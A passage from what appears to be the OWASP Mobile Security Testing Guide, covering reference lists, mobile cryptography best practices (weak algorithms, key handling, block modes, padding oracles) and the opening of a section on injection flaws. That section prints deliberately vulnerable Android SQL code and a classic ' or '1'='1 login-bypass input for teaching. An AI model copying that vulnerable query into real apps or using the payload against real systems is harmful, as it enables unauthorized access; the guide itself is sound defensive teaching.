\href{https://github.com/google/google-authenticator-android}{Google
Authenticator}.

\hypertarget{dynamic-analysis-5}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-5}}

Identify all of the tested application's critical operations (e.g., user
enrollment, account recovery, and financial transactions). Ensure that
each critical operation requires at least one additional verification
channel. Make sure that directly calling the function doesn't bypass the
usage of these channels.

\hypertarget{references-3}{%
\subsubsection{References}\label{references-3}}

\hypertarget{owasp-masvs-2}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-2}}

\begin{itemize}
\tightlist
\item
  MSTG-NETWORK-1: ``Data is encrypted on the network using TLS. The
  secure channel is used consistently throughout the app.''
\item
  MSTG-NETWORK-2: ``The TLS settings are in line with current best
  practices, or as close as possible if the mobile operating system does
  not support the recommended standards.''
\item
  MSTG-NETWORK-5: ``The app doesn't rely on a single insecure
  communication channel (email or SMS) for critical operations, such as
  enrollments and account recovery.''
\end{itemize}

\hypertarget{tools-2}{%
\paragraph{Tools}\label{tools-2}}

\begin{itemize}
\tightlist
\item
  bettercap - \url{https://www.bettercap.org}
\item
  Burp Suite - \url{https://portswigger.net/burp/}
\item
  OWASP ZAP - \url{https://www.owasp.org/index.php/}
\item
  tcpdump - \url{https://www.androidtcpdump.com/}
\item
  Testssl.sh - \url{https://github.com/drwetter/testssl.sh}
\item
  Wireshark - \url{https://www.wireshark.org/}
\end{itemize}

\hypertarget{android}{%
\paragraph{Android}\label{android}}

\begin{itemize}
\tightlist
\item
  Android supported Cipher suites -
  \url{https://developer.android.com/reference/javax/net/ssl/SSLSocket\#Cipher\%20suites}
\item
  Android documentation: Android 10 Changes -
  \url{https://developer.android.com/about/versions/10/behavior-changes-all}
\end{itemize}

\hypertarget{ios}{%
\paragraph{iOS}\label{ios}}

\begin{itemize}
\tightlist
\item
  iOS supported Cipher suites -
  \url{https://developer.apple.com/documentation/security/1550981-ssl_cipher_suite_values?language=objc}
\end{itemize}

\hypertarget{iana-transport-layer-security-tls-parameters}{%
\paragraph{IANA Transport Layer Security (TLS)
Parameters}\label{iana-transport-layer-security-tls-parameters}}

\begin{itemize}
\tightlist
\item
  TLS Cipher Suites -
  \url{https://www.iana.org/assignments/tls-parameters/tls-parameters.xhtml\#tls-parameters-4}
\end{itemize}

\hypertarget{owasp-tls-cipher-string-cheat-sheet}{%
\paragraph{OWASP TLS Cipher String Cheat
Sheet}\label{owasp-tls-cipher-string-cheat-sheet}}

\begin{itemize}
\tightlist
\item
  Recommendations for a cipher string -
  \url{https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/TLS_Cipher_String_Cheat_Sheet.md}
\end{itemize}

\hypertarget{sim-swapping-attacks}{%
\paragraph{SIM Swapping attacks}\label{sim-swapping-attacks}}

\begin{itemize}
\tightlist
\item
  The SIM Hijackers -
  \url{https://motherboard.vice.com/en_us/article/vbqax3/hackers-sim-swapping-steal-phone-numbers-instagram-bitcoin}
\item
  SIM swapping: how the mobile security feature can lead to a hacked
  bank account -
  \url{https://www.fintechnews.org/sim-swapping-how-the-mobile-security-feature-can-lead-to-a-hacked-bank-account/}
\end{itemize}

\hypertarget{nist}{%
\paragraph{NIST}\label{nist}}

\begin{itemize}
\tightlist
\item
  FIPS PUB 186 - Digital Signature Standard (DSS)
\end{itemize}

\hypertarget{sim-swap-fraud}{%
\paragraph{SIM Swap Fraud}\label{sim-swap-fraud}}

\begin{itemize}
\tightlist
\item
  \url{https://motherboard.vice.com/en_us/article/vbqax3/hackers-sim-swapping-steal-phone-numbers-instagram-bitcoin}
\item
  How to protect yourself against a SIM swap attack -
  \url{https://www.wired.com/story/sim-swap-attack-defend-phone/}
\end{itemize}

\hypertarget{ietf}{%
\paragraph{IETF}\label{ietf}}

\begin{itemize}
\tightlist
\item
  RFC 6176 - \url{https://tools.ietf.org/html/rfc6176}
\item
  RFC 6101 - \url{https://tools.ietf.org/html/rfc6101}
\item
  RFC 2246 - \url{https://www.ietf.org/rfc/rfc2246}
\item
  RFC 4346 - \url{https://tools.ietf.org/html/rfc4346}
\item
  RFC 5246 - \url{https://tools.ietf.org/html/rfc5246}
\item
  RFC 8446 - \url{https://tools.ietf.org/html/rfc8446}
\item
  RFC 6979 - \url{https://tools.ietf.org/html/rfc6979}
\item
  RFC 8017 - \url{https://tools.ietf.org/html/rfc8017}
\item
  RFC 2631 - \url{https://tools.ietf.org/html/rfc2631}
\item
  RFC 7919 - \url{https://tools.ietf.org/html/rfc7919}
\item
  RFC 4492 - \url{https://tools.ietf.org/html/rfc4492}
\item
  RFC 4279 - \url{https://tools.ietf.org/html/rfc4279}
\item
  RFC 2631 - \url{https://tools.ietf.org/html/rfc2631}
\item
  RFC 8422 - \url{https://tools.ietf.org/html/rfc8422}
\item
  RFC 5489 - \url{https://tools.ietf.org/html/rfc5489}
\item
  RFC 4772 - \url{https://tools.ietf.org/html/rfc4772}
\item
  RFC 1829 - \url{https://tools.ietf.org/html/rfc1829}
\item
  RFC 2420 - \url{https://tools.ietf.org/html/rfc2420}
\item
  RFC 3268 - \url{https://tools.ietf.org/html/rfc3268}
\item
  RFC 5288 - \url{https://tools.ietf.org/html/rfc5288}
\item
  RFC 7465 - \url{https://tools.ietf.org/html/rfc7465}
\item
  RFC 7905 - \url{https://tools.ietf.org/html/rfc7905}
\item
  RFC 7539 - \url{https://tools.ietf.org/html/rfc7539}
\item
  RFC 6151 - \url{https://tools.ietf.org/html/rfc6151}
\item
  RFC 6234 - \url{https://tools.ietf.org/html/rfc6234}
\item
  RFC 8447 - \url{https://tools.ietf.org/html/rfc8447\#section-8}
\end{itemize}

\hypertarget{cryptography-for-mobile-apps}{%
\subsection{Cryptography for Mobile
Apps}\label{cryptography-for-mobile-apps}}

Cryptography plays an especially important role in securing the user's
data - even more so in a mobile environment, where attackers having
physical access to the user's device is a likely scenario. This chapter
provides an outline of cryptographic concepts and best practices
relevant to mobile apps. These best practices are valid independent of
the mobile operating system.

\hypertarget{key-concepts}{%
\subsubsection{Key Concepts}\label{key-concepts}}

The goal of cryptography is to provide constant confidentiality, data
integrity, and authenticity, even in the face of an attack.
Confidentiality involves ensuring data privacy through the use of
encryption. Data integrity deals with data consistency and detection of
tampering and modification of data. Authenticity ensures that the data
comes from a trusted source.

Encryption algorithms converts plaintext data into cipher text that
conceals the original content. Plaintext data can be restored from the
cipher text through decryption. Encryption can be \textbf{symmetric}
(secret-key encryption) or \textbf{asymmetric} (public-key encryption).
In general, encryption operations do not protect integrity, but some
symmetric encryption modes also feature that protection.

\textbf{Symmetric-key encryption algorithms} use the same key for both
encryption and decryption. This type of encryption is fast and suitable
for bulk data processing. Since everybody who has access to the key is
able to decrypt the encrypted content, this method requires careful key
management.

\textbf{Public-key encryption algorithms} operate with two separate
keys: the public key and the private key. The public key can be
distributed freely while the private key shouldn't be shared with
anyone. A message encrypted with the public key can only be decrypted
with the private key. Since asymmetric encryption is several times
slower than symmetric operations, it's typically only used to encrypt
small amounts of data, such as symmetric keys for bulk encryption.

\textbf{Hashing} isn't a form of encryption, but it does use
cryptography. Hash functions deterministically map arbitrary pieces of
data into fixed-length values. It's easy to compute the hash from the
input, but very difficult (i.e.~infeasible) to determine the original
input from the hash. Hash functions are used for integrity verification,
but don't provide an authenticity guarantee.

\textbf{Message Authentication Codes} (MACs) combine other cryptographic
mechanisms (such as symmetric encryption or hashes) with secret keys to
provide both integrity and authenticity protection. However, in order to
verify a MAC, multiple entities have to share the same secret key and
any of those entities can generate a valid MAC. HMACs, the most commonly
used type of MAC, rely on hashing as the underlying cryptographic
primitive. The full name of an HMAC algorithm usually includes the
underlying hash function's type (for example, HMAC-SHA256 uses the
SHA-256 hash function).

\textbf{Signatures} combine asymmetric cryptography (that is, using a
public/private key pair) with hashing to provide integrity and
authenticity by encrypting the hash of the message with the private key.
However, unlike MACs, signatures also provide non-repudiation property
as the private key should remain unique to the data signer.

\textbf{Key Derivation Functions} (KDFs) derive secret keys from a
secret value (such as a password) and are used to turn keys into other
formats or to increase their length. KDFs are similar to hashing
functions but have other uses as well (for example, they are used as
components of multi-party key-agreement protocols). While both hashing
functions and KDFs must be difficult to reverse, KDFs have the added
requirement that the keys they produce must have a level of randomness.

\hypertarget{identifying-insecure-andor-deprecated-cryptographic-algorithms-mstg-crypto-4}{%
\subsubsection{Identifying Insecure and/or Deprecated Cryptographic
Algorithms
(MSTG-CRYPTO-4)}\label{identifying-insecure-andor-deprecated-cryptographic-algorithms-mstg-crypto-4}}

When assessing a mobile app, you should make sure that it does not use
cryptographic algorithms and protocols that have significant known
weaknesses or are otherwise insufficient for modern security
requirements. Algorithms that were considered secure in the past may
become insecure over time; therefore, it's important to periodically
check current best practices and adjust configurations accordingly.

Verify that cryptographic algorithms are up to date and in-line with
industry standards. Vulnerable algorithms include outdated block ciphers
(such as DES and 3DES), stream ciphers (such as RC4), hash functions
(such as MD5 and SHA1), and broken random number generators (such as
Dual\_EC\_DRBG and SHA1PRNG). Note that even algorithms that are
certified (for example, by NIST) can become insecure over time. A
certification does not replace periodic verification of an algorithm's
soundness. Algorithms with known weaknesses should be replaced with more
secure alternatives.

Inspect the app's source code to identify instances of cryptographic
algorithms that are known to be weak, such as:

\begin{itemize}
\tightlist
\item
  \href{https://www.enisa.europa.eu/publications/algorithms-key-size-and-parameters-report-2014}{DES,
  3DES}
\item
  RC2
\item
  RC4
\item
  \href{https://www.enisa.europa.eu/publications/algorithms-key-size-and-parameters-report-2014}{BLOWFISH}
\item
  MD4
\item
  MD5
\item
  SHA1
\end{itemize}

The names of cryptographic APIs depend on the particular mobile
platform.

Please make sure that:

\begin{itemize}
\tightlist
\item
  Cryptographic algorithms are up to date and in-line with industry
  standards. This includes, but is not limited to outdated block ciphers
  (e.g.~DES), stream ciphers (e.g.~RC4), as well as hash functions
  (e.g.~MD5) and broken random number generators like Dual\_EC\_DRBG
  (even if they are NIST certified). All of these should be marked as
  insecure and should not be used and removed from the application and
  server.
\item
  Key lengths are in-line with industry standards and provide protection
  for sufficient amount of time. A comparison of different key lengths
  and protection they provide taking into account Moore's law is
  available \href{https://www.keylength.com/}{online}.
\item
  Cryptographic means are not mixed with each other: e.g.~you do not
  sign with a public key, or try to reuse a keypair used for a signature
  to do encryption.
\item
  Cryptographic parameters are well defined within reasonable range.
  This includes, but is not limited to: cryptographic salt, which should
  be at least the same length as hash function output, reasonable choice
  of password derivation function and iteration count (e.g.~PBKDF2,
  scrypt or bcrypt), IVs being random and unique, fit-for-purpose block
  encryption modes (e.g.~ECB should not be used, except specific cases),
  key management being done properly (e.g.~3DES should have three
  independent keys) and so on.
\end{itemize}

The following algorithms are recommended:

\begin{itemize}
\tightlist
\item
  Confidentiality algorithms: AES-GCM-256 or ChaCha20-Poly1305
\item
  Integrity algorithms: SHA-256, SHA-384, SHA-512, Blake2, the SHA-3
  family
\item
  Digital signature algorithms: RSA (3072 bits and higher), ECDSA with
  NIST P-384
\item
  Key establishment algorithms: RSA (3072 bits and higher), DH (3072
  bits or higher), ECDH with NIST P-384
\end{itemize}

Additionally, you should always rely on secure hardware (if available)
for storing encryption keys, performing cryptographic operations, etc.

For more information on algorithm choice and best practices, see the
following resources:

\begin{itemize}
\tightlist
\item
  \href{https://cryptome.org/2016/01/CNSA-Suite-and-Quantum-Computing-FAQ.pdf}{``Commercial
  National Security Algorithm Suite and Quantum Computing FAQ''}
\item
  \href{https://www.keylength.com/en/4/}{NIST recommendations (2019)}
\item
  \href{https://www.keylength.com/en/8/}{BSI recommendations (2019)}
\end{itemize}

\hypertarget{common-configuration-issues-mstg-crypto-1-mstg-crypto-2-and-mstg-crypto-3}{%
\subsubsection{Common Configuration Issues (MSTG-CRYPTO-1, MSTG-CRYPTO-2
and
MSTG-CRYPTO-3)}\label{common-configuration-issues-mstg-crypto-1-mstg-crypto-2-and-mstg-crypto-3}}

\hypertarget{insufficient-key-length}{%
\paragraph{Insufficient Key Length}\label{insufficient-key-length}}

Even the most secure encryption algorithm becomes vulnerable to
brute-force attacks when that algorithm uses an insufficient key size.

Ensure that the key length fulfills
\href{https://www.enisa.europa.eu/publications/algorithms-key-size-and-parameters-report-2014}{accepted
industry standards}.

\hypertarget{symmetric-encryption-with-hard-coded-cryptographic-keys}{%
\paragraph{Symmetric Encryption with Hard-Coded Cryptographic
Keys}\label{symmetric-encryption-with-hard-coded-cryptographic-keys}}

The security of symmetric encryption and keyed hashes (MACs) depends on
the secrecy of the key. If the key is disclosed, the security gained by
encryption is lost. To prevent this, never store secret keys in the same
place as the encrypted data they helped create. A common mistake is
encrypting locally stored data with a static, hardcoded encryption key
and compiling that key into the app. This makes the key accessible to
anyone who can use a disassembler.

Hardcoded encryption key means that a key is:

\begin{itemize}
\tightlist
\item
  part of application resources
\item
  value which can be derived from known values
\item
  hardcoded in code
\end{itemize}

First, ensure that no keys or passwords are stored within the source
code. This means you should check native code, JavaScript/Dart code,
Java/Kotlin code on Android and Objective-C/Swift in iOS. Note that
hard-coded keys are problematic even if the source code is obfuscated
since obfuscation is easily bypassed by dynamic instrumentation.

If the app is using two-way SSL (both server and client certificates are
validated), make sure that:

\begin{verbatim}
1. The password to the client certificate isn't stored locally or is locked in the device Keychain.
2. The client certificate isn't shared among all installations.
\end{verbatim}

If the app relies on an additional encrypted container stored in app
data, check how the encryption key is used. If a key-wrapping scheme is
used, ensure that the master secret is initialized for each user or the
container is re-encrypted with new key. If you can use the master secret
or previous password to decrypt the container, check how password
changes are handled.

Secret keys must be stored in secure device storage whenever symmetric
cryptography is used in mobile apps. For more information on the
platform-specific APIs, see the
``\href{0x05d-Testing-Data-Storage.md}{Data Storage on Android}'' and
``\href{0x06d-Testing-Data-Storage.md}{Data Storage on iOS}'' chapters.

\hypertarget{weak-key-generation-functions}{%
\paragraph{Weak Key Generation
Functions}\label{weak-key-generation-functions}}

Cryptographic algorithms (such as symmetric encryption or some MACs)
expect a secret input of a given size. For example, AES uses a key of
exactly 16 bytes. A native implementation might use the user-supplied
password directly as an input key. Using a user-supplied password as an
input key has the following problems:

\begin{itemize}
\tightlist
\item
  If the password is smaller than the key, the full key space isn't
  used. The remaining space is padded (spaces are sometimes used for
  padding).
\item
  A user-supplied password will realistically consist mostly of
  displayable and pronounceable characters. Therefore, only some of the
  possible 256 ASCII characters are used and entropy is decreased by
  approximately a factor of four.
\end{itemize}

Ensure that passwords aren't directly passed into an encryption
function. Instead, the user-supplied password should be passed into a
KDF to create a cryptographic key. Choose an appropriate iteration count
when using password derivation functions. For example,
\href{https://pages.nist.gov/800-63-3/sp800-63b.html\#sec5}{NIST
recommends an iteration count of at least 10,000 for PBKDF2} and
\href{https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-132.pdf}{for
critical keys where user-perceived performance is not critical at least
10,000,000}. For critical keys, it is recommended to consider
implementation of algorithms recognized by
\href{https://password-hashing.net/}{Password Hashing Competition (PHC)}
like \href{https://github.com/p-h-c/phc-winner-argon2}{Argon2}.

\hypertarget{weak-random-number-generators}{%
\paragraph{Weak Random Number
Generators}\label{weak-random-number-generators}}

It is fundamentally impossible to produce truly random numbers on any
deterministic device. Pseudo-random number generators (RNG) compensate
for this by producing a stream of pseudo-random numbers - a stream of
numbers that \emph{appear} as if they were randomly generated. The
quality of the generated numbers varies with the type of algorithm used.
\emph{Cryptographically secure} RNGs generate random numbers that pass
statistical randomness tests, and are resilient against prediction
attacks (e.g.~it is statistically infeasible to predict the next number
produced).

Mobile SDKs offer standard implementations of RNG algorithms that
produce numbers with sufficient artificial randomness. We'll introduce
the available APIs in the Android and iOS specific sections.

\hypertarget{custom-implementations-of-cryptography}{%
\paragraph{Custom Implementations of
Cryptography}\label{custom-implementations-of-cryptography}}

Inventing proprietary cryptographic functions is time consuming,
difficult, and likely to fail. Instead, we can use well-known algorithms
that are widely regarded as secure. Mobile operating systems offer
standard cryptographic APIs that implement those algorithms.

Carefully inspect all the cryptographic methods used within the source
code, especially those that are directly applied to sensitive data. All
cryptographic operations should use standard cryptographic APIs for
Android and iOS (we'll write about those in more detail in the
platform-specific chapters). Any cryptographic operations that don't
invoke standard routines from known providers should be closely
inspected. Pay close attention to standard algorithms that have been
modified. Remember that encoding isn't the same as encryption! Always
investigate further when you find bit manipulation operators like XOR
(exclusive OR).

At all implementations of cryptography, you need to ensure that the
following always takes place:

\begin{itemize}
\tightlist
\item
  Worker keys (like intermediary/derived keys in AES/DES/Rijndael) are
  properly removed from memory after consumption.
\item
  The inner state of a cipher should be removed from memory as soon as
  possible.
\end{itemize}

\hypertarget{inadequate-aes-configuration}{%
\paragraph{Inadequate AES
Configuration}\label{inadequate-aes-configuration}}

Advanced Encryption Standard (AES) is the widely accepted standard for
symmetric encryption in mobile apps. It's an iterative block cipher that
is based on a series of linked mathematical operations. AES performs a
variable number of rounds on the input, each of which involve
substitution and permutation of the bytes in the input block. Each round
uses a 128-bit round key which is derived from the original AES key.

As of this writing, no efficient cryptanalytic attacks against AES have
been discovered. However, implementation details and configurable
parameters such as the block cipher mode leave some margin for error.

\hypertarget{weak-block-cipher-mode}{%
\subparagraph{Weak Block Cipher Mode}\label{weak-block-cipher-mode}}

Block-based encryption is performed upon discrete input blocks (for
example, AES has 128-bit blocks). If the plaintext is larger than the
block size, the plaintext is internally split up into blocks of the
given input size and encryption is performed on each block. A block
cipher mode of operation (or block mode) determines if the result of
encrypting the previous block impacts subsequent blocks.

\href{https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation\#Electronic_Codebook_.28ECB.29}{ECB
(Electronic Codebook)} divides the input into fixed-size blocks that are
encrypted separately using the same key. If multiple divided blocks
contain the same plaintext, they will be encrypted into identical
ciphertext blocks which makes patterns in data easier to identify. In
some situations, an attacker might also be able to replay the encrypted
data.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/8c5c6e36f8f96c2a99d646eadbb33514e8031732.png}
\caption{Images/Chapters/0x07c/EncryptionMode.png}
\end{figure}

Verify that Cipher Block Chaining (CBC) mode is used instead of ECB. In
CBC mode, plaintext blocks are XORed with the previous ciphertext block.
This ensures that each encrypted block is unique and randomized even if
blocks contain the same information. Please note that it is best to
combine CBC with an HMAC and/or ensure that no errors are given such as
``Padding error'', ``MAC error'', ``decryption failed'' in order to be
more resistant to a padding oracle attack.

When storing encrypted data, we recommend using a block mode that also
protects the integrity of the stored data, such as Galois/Counter Mode
(GCM). The latter has the additional benefit that the algorithm is
mandatory for each TLSv1.2 implementation, and thus is available on all
modern platforms.

For more information on effective block modes, see the
\href{https://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html}{NIST
guidelines on block mode selection}.

\hypertarget{predictable-initialization-vector}{%
\subparagraph{Predictable Initialization
Vector}\label{predictable-initialization-vector}}

CBC, OFB, CFB, PCBC mode require an initialization vector (IV) as an
initial input to the cipher. The IV doesn't have to be kept secret, but
it shouldn't be predictable. Make sure that IVs are generated using a
cryptographically secure random number generator. For more information
on IVs, see
\href{http://www.cryptofails.com/post/70059609995/crypto-noobs-1-initialization-vectors}{Crypto
Fail's initialization vectors article}.

\hypertarget{initialization-vectors-in-stateful-operation-modes}{%
\subparagraph{Initialization Vectors in stateful operation
modes}\label{initialization-vectors-in-stateful-operation-modes}}

Please note that the usage of IVs is different when using CTR and GCM
mode in which the initialization vector is often a counter (in CTR
combined with a nonce). So here using a predictable IV with its own
stateful model is exactly what is needed. In CTR you have a new nonce
plus counter as an input to every new block operation. For example: for
a 5120 bit long plaintext: you have 20 blocks, so you need 20 input
vectors consisting of a nonce and counter. Whereas in GCM you have a
single IV per cryptographic operation, which should not be repeated with
the same key. See section 8 of the
\href{https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf}{documentation
from NIST on GCM} for more details and recommendations of the IV.

\hypertarget{padding-oracle-attacks-due-to-weaker-padding-or-block-operation-implementations}{%
\paragraph{Padding Oracle Attacks due to Weaker Padding or Block
Operation
Implementations}\label{padding-oracle-attacks-due-to-weaker-padding-or-block-operation-implementations}}

In the old days, \href{https://tools.ietf.org/html/rfc2313}{PKCS1.5}
padding (in code: \texttt{PKCS1Padding}) was used as a padding mechanism
when doing asymmetric encryption. This mechanism is vulnerable to the
padding oracle attack. Therefore, it is best to use OAEP (Optimal
Asymmetric Encryption Padding) captured in
\href{https://tools.ietf.org/html/rfc2437}{PKCS\#1 v2.0} (in code:
\texttt{OAEPPadding}, \texttt{OAEPwithSHA-256andMGF1Padding},
\texttt{OAEPwithSHA-224andMGF1Padding},
\texttt{OAEPwithSHA-384andMGF1Padding},
\texttt{OAEPwithSHA-512andMGF1Padding}). Note that, even when using
OAEP, you can still run into an issue known best as the Mangers attack
as described
\href{https://research.kudelskisecurity.com/2018/04/05/breaking-rsa-oaep-with-mangers-attack/}{in
the blog at Kudelskisecurity}.

Note: AES-CBC with PKCS \#5 has shown to be vulnerable to padding oracle
attacks as well, given that the implementation gives warnings, such as
``Padding error'', ``MAC error'', or ``decryption failed''. See
\href{https://robertheaton.com/2013/07/29/padding-oracle-attack/}{The
Padding Oracle Attack} and
\href{https://eklitzke.org/the-cbc-padding-oracle-problem}{The CBC
Padding Oracle Problem} for an example. Next, it is best to ensure that
you add an HMAC after you encrypt the plaintext: after all a ciphertext
with a failing MAC will not have to be decrypted and can be discarded.

\hypertarget{protecting-keys-in-memory}{%
\paragraph{Protecting Keys in Memory}\label{protecting-keys-in-memory}}

When memory dumping is part of your threat model, then keys can be
accessed the moment they are actively used. Memory dumping either
requires root-access (e.g.~a rooted device or jailbroken device) or it
requires a patched application with Frida (so you can use tools like
Fridump). Therefore it is best to consider the following, if keys are
still needed at the device:

\begin{itemize}
\tightlist
\item
  make sure that all cryptographic actions and the keys itself remain in
  the Trusted Execution Environment (e.g.~use Android Keystore) or
  Secure Enclave (e.g.~use the Keychain and when you sign, use ECDHE).
\item
  If keys are necessary which are outside of the TEE / SE, make sure you
  obfuscate/encrypt them and only de-obfuscate them during use. Always
  zero out keys before the memory is released, whether using native code
  or not. This means: overwrite the memory structure (e.g.~nullify the
  array) and know that most of the Immutable types in Android (such as
  \texttt{BigInteger} and \texttt{String}) stay in the heap.
\end{itemize}

Note: given the ease of memory dumping, never share the same key among
accounts and/or devices, other than public keys used for signature
verification or encryption.

\hypertarget{protecting-keys-in-transport}{%
\paragraph{Protecting keys in
Transport}\label{protecting-keys-in-transport}}

When keys need to be transported from one device to another, or from the
app to a backend, make sure that proper key protection is in place, by
means of an transport keypair or another mechanism. Often, keys are
shared with obfuscation methods which can be easily reversed. Instead,
make sure asymmetric cryptography or wrapping keys are used.

\hypertarget{cryptographic-apis-on-android-and-ios}{%
\subsubsection{Cryptographic APIs on Android and
iOS}\label{cryptographic-apis-on-android-and-ios}}

While same basic cryptographic principles apply independent of the
particular OS, each operating system offers its own implementation and
APIs. Platform-specific cryptographic APIs for data storage are covered
in greater detail in the ``\href{0x05d-Testing-Data-Storage.md}{Data
Storage on Android}'' and ``\href{0x06d-Testing-Data-Storage.md}{Testing
Data Storage on iOS}'' chapters. Encryption of network traffic,
especially Transport Layer Security (TLS), is covered in the
``\href{0x05g-Testing-Network-Communication.md}{Android Network APIs}''
chapter.

\hypertarget{cryptographic-policy}{%
\subsubsection{Cryptographic policy}\label{cryptographic-policy}}

In larger organizations, or when high-risk applications are created, it
can often be a good practice to have a cryptographic policy, based on
frameworks such as
\href{https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r4.pdf}{NIST
Recommendation for Key Management}. When basic errors are found in the
application of cryptography, it can be a good starting point of setting
up a lessons learned / cryptographic key management policy.

\hypertarget{references-4}{%
\paragraph{References}\label{references-4}}

\hypertarget{cryptography-references}{%
\subparagraph{Cryptography References}\label{cryptography-references}}

\begin{itemize}
\tightlist
\item
  \href{https://github.com/p-h-c/phc-winner-argon2}{Argon2}
\item
  \href{https://research.kudelskisecurity.com/2018/04/05/breaking-rsa-oaep-with-mangers-attack/}{Breaking
  RSA with Mangers Attack}
\item
  \href{https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf}{NIST
  800-38d}
\item
  \href{https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-4/final}{NIST
  800-57Rev4}
\item
  \href{https://pages.nist.gov/800-63-3/sp800-63b.html}{NIST 800-63b}
\item
  \href{https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-132.pdf}{NIST
  800-132}
\item
  \href{https://password-hashing.net}{Password Hashing Competition(PHC)}
\item
  \href{https://tools.ietf.org/html/rfc2313}{PKCS \#1: RSA Encryption
  Version 1.5}
\item
  \href{https://tools.ietf.org/html/rfc2437}{PKCS \#1: RSA Cryptography
  Specifications Version 2.0}
\item
  \href{https://tools.ietf.org/html/rfc2315}{PKCS \#7: Cryptographic
  Message Syntax Version 1.5}
\item
  \href{https://robertheaton.com/2013/07/29/padding-oracle-attack}{The
  Padding Oracle Attack}
\item
  \href{https://eklitzke.org/the-cbc-padding-oracle-problem}{The CBC
  Padding Oracle Problem}
\end{itemize}

\hypertarget{owasp-masvs-3}{%
\subparagraph{OWASP MASVS}\label{owasp-masvs-3}}

\begin{itemize}
\tightlist
\item
  MSTG-ARCH-8: ``There is an explicit policy for how cryptographic keys
  (if any) are managed, and the lifecycle of cryptographic keys is
  enforced. Ideally, follow a key management standard such as NIST SP
  800-57.''
\item
  MSTG-CRYPTO-1: ``The app does not rely on symmetric cryptography with
  hardcoded keys as a sole method of encryption.''
\item
  MSTG-CRYPTO-2: ``The app uses proven implementations of cryptographic
  primitives.''
\item
  MSTG-CRYPTO-3: ``The app uses cryptographic primitives that are
  appropriate for the particular use-case, configured with parameters
  that adhere to industry best practices.''
\item
  MSTG-CRYPTO-4: ``The app does not use cryptographic protocols or
  algorithms that are widely considered deprecated for security
  purposes.''
\end{itemize}

\hypertarget{testing-code-quality}{%
\subsection{Testing Code Quality}\label{testing-code-quality}}

Mobile app developers use a wide variety of programming languages and
frameworks. As such, common vulnerabilities such as SQL injection,
buffer overflows, and cross-site scripting (XSS), may manifest in apps
when neglecting secure programming practices.

The same programming flaws may affect both Android and iOS apps to some
degree, so we'll provide an overview of the most common vulnerability
classes frequently in the general section of the guide. In later
sections, we will cover OS-specific instances and exploit mitigation
features.

\hypertarget{injection-flaws-mstg-arch-2-and-mstg-platform-2}{%
\subsubsection{Injection Flaws (MSTG-ARCH-2 and
MSTG-PLATFORM-2)}\label{injection-flaws-mstg-arch-2-and-mstg-platform-2}}

An \emph{injection flaw} describes a class of security vulnerability
occurring when user input is inserted into backend queries or commands.
By injecting meta-characters, an attacker can execute malicious code
that is inadvertently interpreted as part of the command or query. For
example, by manipulating a SQL query, an attacker could retrieve
arbitrary database records or manipulate the content of the backend
database.

Vulnerabilities of this class are most prevalent in server-side web
services. Exploitable instances also exist within mobile apps, but
occurrences are less common, plus the attack surface is smaller.

For example, while an app might query a local SQLite database, such
databases usually do not store sensitive data (assuming the developer
followed basic security practices). This makes SQL injection a
non-viable attack vector. Nevertheless, exploitable injection
vulnerabilities sometimes occur, meaning proper input validation is a
necessary best practice for programmers.

\hypertarget{sql-injection}{%
\paragraph{SQL Injection}\label{sql-injection}}

A \emph{SQL injection} attack involves integrating SQL commands into
input data, mimicking the syntax of a predefined SQL command. A
successful SQL injection attack allows the attacker to read or write to
the database and possibly execute administrative commands, depending on
the permissions granted by the server.

Apps on both Android and iOS use SQLite databases as a means to control
and organize local data storage. Assume an Android app handles local
user authentication by storing the user credentials in a local database
(a poor programming practice we'll overlook for the sake of this
example). Upon login, the app queries the database to search for a
record with the username and password entered by the user:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{SQLiteDatabase db;}

\BuiltInTok{String}\NormalTok{ sql = }\StringTok{"SELECT * FROM users WHERE username = \textquotesingle{}"}\NormalTok{ +  username + }\StringTok{"\textquotesingle{} AND password = \textquotesingle{}"}\NormalTok{ + password +}\StringTok{"\textquotesingle{}"}\NormalTok{;}

\BuiltInTok{Cursor}\NormalTok{ c = db.}\FunctionTok{rawQuery}\NormalTok{( sql, }\KeywordTok{null}\NormalTok{ );}

\KeywordTok{return}\NormalTok{ c.}\FunctionTok{getCount}\NormalTok{() != }\DecValTok{0}\NormalTok{;}
\end{Highlighting}
\end{Shaded}

Let's further assume an attacker enters the following values into the
``username'' and ``password'' fields:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{username }\OperatorTok{=} \DecValTok{1}\StringTok{\textquotesingle{} or \textquotesingle{}}\DecValTok{1}\StringTok{\textquotesingle{} = \textquotesingle{}}\DecValTok{1}
\KeywordTok{password} \OperatorTok{=} \DecValTok{1}\StringTok{\textquotesingle{} or \textquotesingle{}}\DecValTok{1}\StringTok{\textquotesingle{} = \textquotesingle{}}\DecValTok{1}
\end{Highlighting}
\end{Shaded}

This results in the following query:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{SELECT} \OperatorTok{*} \KeywordTok{FROM}\NormalTok{ users }\KeywordTok{WHERE}\NormalTok{ username}\OperatorTok{=}\StringTok{\textquotesingle{}1\textquotesingle{}} \KeywordTok{OR} \StringTok{\textquotesingle{}1\textquotesingle{}} \OperatorTok{=} \StringTok{\textquotesingle{}1\textquotesingle{}} \KeywordTok{AND} \KeywordTok{Password}\OperatorTok{=}\StringTok{\textquotesingle{}1\textquotesingle{}} \KeywordTok{OR} \StringTok{\textquotesingle{}1\textquotesingle{}} \OperatorTok{=} \StringTok{\textquotesingle{}1\textquotesingle{}}
\end{Highlighting}
\end{Shaded}

Because the condition
\texttt{\textquotesingle{}1\textquotesingle{}\ =\ \textquotesingle{}1\textquotesingle{}}
always evaluates as true, this query return all records in the database,
causing the login function to return \texttt{true} even though no valid
user account was entered.

